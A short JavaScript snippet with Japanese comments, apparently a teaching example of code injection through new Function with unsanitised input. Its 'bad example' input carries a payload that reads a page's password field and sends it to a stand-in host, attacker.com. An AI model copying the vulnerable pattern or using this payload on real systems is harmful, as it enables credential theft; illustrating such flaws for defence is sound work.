function f(input) {
    const f = new Function(`return "Hello, " + ${input}`);
    console.log(f());
  }

  //重大な問題：コードインジェクション攻撃が発生する可能性があります。攻撃者が意図的に｛input｝に任意の文字列を入れて、システムに攻撃できます。


  //悪い例：ユーザーのパスワードを取得
  const input = `"; 
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "https://attacker.com/?password=" + document.getElementById("password").value, true);
    xhr.send();
    return "evil code"; // この行は実行されない`;
